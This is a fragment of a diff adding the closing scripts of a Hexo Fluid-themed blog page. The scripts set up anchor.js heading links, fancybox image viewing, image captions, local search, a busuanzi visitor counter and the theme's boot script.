+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
